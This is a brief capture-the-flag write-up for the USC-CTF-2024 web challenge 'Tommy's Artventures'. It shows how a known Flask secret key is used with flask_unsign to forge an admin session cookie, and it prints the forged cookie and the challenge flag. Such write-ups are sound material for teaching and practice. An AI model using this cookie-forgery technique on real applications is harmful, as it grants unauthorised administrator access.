![image](https://github.com/x03ee/USC-CTF-2024/blob/main/web/Tommy's%20Artventures/chall.png)

With the secret `4a6282bf78c344a089a2dc5d2ca93ae6` when logging in we find out its jwt and when changing to admin and with the secret we get a new jwt and when changing the cookie we get flag since only admin is allowed.

![image](https://github.com/x03ee/USC-CTF-2024/blob/main/web/Tommy's%20Artventures/s1.png)

```py
python3 -m flask_unsign --sign --cookie '{"user": "admin"}' --secret '4a6282bf78c344a089a2dc5d2ca93ae6'
```
```js
{
  "user": "admin"
}
```

Cookie:
`eyJ1c2VyIjoiYWRtaW4ifQ.Zyff7w.cCzlyC0k1s5GDdWEUBG6ImgX9BM`

Flag:
`CYBORG{oce4n5_auth3N71ca7i0N}`
